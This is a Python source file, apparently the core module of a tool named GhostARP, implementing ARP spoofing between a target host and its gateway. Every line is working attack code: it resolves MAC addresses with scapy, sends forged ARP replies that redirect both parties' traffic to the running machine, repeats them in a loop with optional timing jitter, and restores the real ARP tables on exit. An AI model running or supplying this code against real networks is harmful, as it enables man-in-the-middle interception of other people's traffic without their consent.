"""Core ARP spoofing engine for GhostARP."""
from __future__ import annotations

import logging
import random
import time
from typing import Callable, Dict, Optional

from .utils import GhostARPError, is_valid_ipv4

log = logging.getLogger("ghostarp.core")

DEFAULT_TIMEOUT = 1.0
DEFAULT_RETRIES = 3
RESTORE_COUNT = 4
BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"


class Spoofer:
    """Spoofs (and restores) ARP entries between a target and a gateway.

    Two ARP replies are sent each cycle: the target is told the gateway's MAC
    is ours, and the gateway is told the target's MAC is ours. Both real ARP
    tables are restored automatically when the run ends.
    """

    def __init__(
        self,
        target_ip: str,
        gateway_ip: str,
        interface: Optional[str] = None,
        interval: float = 2.0,
        jitter: float = 0.0,
        timeout: float = DEFAULT_TIMEOUT,
        retries: int = DEFAULT_RETRIES,
        scapy=None,  # injectable scapy module (used by tests)
    ) -> None:
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.interval = max(0.0, float(interval))
        self.jitter = max(0.0, float(jitter))
        if self.jitter > self.interval:
            log.warning(
                "jitter (%.2fs) exceeds interval (%.2fs); clamping jitter to interval",
                self.jitter,
                self.interval,
            )
            self.jitter = self.interval
        self.timeout = max(0.1, float(timeout))
        self.retries = max(1, int(retries))
        self._scapy = scapy
        self._mac_cache: Dict[str, str] = {}
        self._validate()

    def _validate(self) -> None:
        for name, ip in (("target", self.target_ip), ("gateway", self.gateway_ip)):
            if not is_valid_ipv4(ip):
                raise GhostARPError(f"Invalid {name} IP address: {ip!r}")
        if self.target_ip == self.gateway_ip:
            raise GhostARPError("Target and gateway IP addresses must be different.")

    def _get_scapy(self):
        if self._scapy is None:
            try:
                import scapy.all as scapy
            except ImportError as exc:
                raise GhostARPError(
                    "scapy is not installed. Install it with: pip install scapy"
                ) from exc
            self._scapy = scapy
        return self._scapy

    def resolve_mac(self, ip: str, use_cache: bool = True) -> Optional[str]:
        """Resolve the MAC address for ``ip`` with retries, caching the result."""
        if use_cache and ip in self._mac_cache:
            return self._mac_cache[ip]
        scapy = self._get_scapy()
        mac: Optional[str] = None
        for attempt in range(1, self.retries + 1):
            try:
                arp_request = scapy.ARP(pdst=ip)
                ether = scapy.Ether(dst=BROADCAST_MAC)
                answered = scapy.srp(
                    ether / arp_request,
                    timeout=self.timeout,
                    verbose=False,
                    iface=self.interface,
                )[0]
            except Exception as exc:  # network or permission errors
                log.debug("ARP resolution attempt %d for %s failed: %s", attempt, ip, exc)
                continue
            if answered:
                mac = answered[0][1].hwsrc
                break
            if attempt < self.retries:
                log.debug("No reply from %s (attempt %d/%d); retrying", ip, attempt, self.retries)
                time.sleep(min(0.5 * attempt, self.timeout))
        if mac:
            self._mac_cache[ip] = mac
        return mac

    def spoof(self) -> int:
        """Send one spoofed ARP reply to the target and one to the gateway.

        Returns the number of packets sent (0, 1 or 2). If a host cannot be
        resolved the cycle is skipped gracefully instead of crashing.
        """
        scapy = self._get_scapy()
        sent = 0
        target_mac = self.resolve_mac(self.target_ip)
        if target_mac is None:
            log.warning("Could not resolve MAC for target %s; skipping this cycle", self.target_ip)
            return 0
        scapy.send(
            scapy.ARP(op=2, pdst=self.target_ip, hwdst=target_mac, psrc=self.gateway_ip),
            iface=self.interface,
            verbose=False,
        )
        sent += 1

        gateway_mac = self.resolve_mac(self.gateway_ip)
        if gateway_mac is None:
            log.warning(
                "Could not resolve MAC for gateway %s; skipping second half of the cycle",
                self.gateway_ip,
            )
            return sent
        scapy.send(
            scapy.ARP(op=2, pdst=self.gateway_ip, hwdst=gateway_mac, psrc=self.target_ip),
            iface=self.interface,
            verbose=False,
        )
        sent += 1
        return sent

    def _send_restore(self, dest_ip: str, dest_mac: str, source_ip: str, source_mac: str) -> None:
        """Tell ``dest_ip`` that ``source_ip`` really has ``source_mac``."""
        scapy = self._get_scapy()
        scapy.send(
            scapy.ARP(
                op=2,
                pdst=dest_ip,
                hwdst=dest_mac,
                psrc=source_ip,
                hwsrc=source_mac,
            ),
            count=RESTORE_COUNT,
            iface=self.interface,
            verbose=False,
        )

    def restore(self) -> int:
        """Restore the real ARP entries for both target and gateway.

        Returns the number of ARP tables successfully restored (0-2).
        """
        self._get_scapy()
        restored = 0
        for dest_ip, source_ip in (
            (self.target_ip, self.gateway_ip),
            (self.gateway_ip, self.target_ip),
        ):
            dest_mac = self.resolve_mac(dest_ip, use_cache=False) or self._mac_cache.get(dest_ip)
            source_mac = self.resolve_mac(source_ip, use_cache=False) or self._mac_cache.get(source_ip)
            if dest_mac is None or source_mac is None:
                log.warning(
                    "Could not resolve MACs for %s / %s; skipping restore", dest_ip, source_ip
                )
                continue
            self._send_restore(dest_ip, dest_mac, source_ip, source_mac)
            restored += 1
            log.info("Restored ARP table for %s", dest_ip)
        return restored

    def run(self, progress: Optional[Callable[[int], None]] = None) -> int:
        """Run the spoofing loop until interrupted; ALWAYS restores ARP tables on exit.

        Returns the total number of packets sent during the run.
        """
        sent = 0
        try:
            while True:
                sent += self.spoof()
                if progress is not None:
                    progress(sent)
                time.sleep(self.interval + random.uniform(0.0, self.jitter))
        except KeyboardInterrupt:
            log.info("Interrupt received; restoring ARP tables...")
        finally:
            try:
                restored = self.restore()
                if restored == 0:
                    log.warning("No ARP entries were restored")
            except Exception as exc:
                log.error("Failed to restore ARP tables: %s", exc)
        return sent
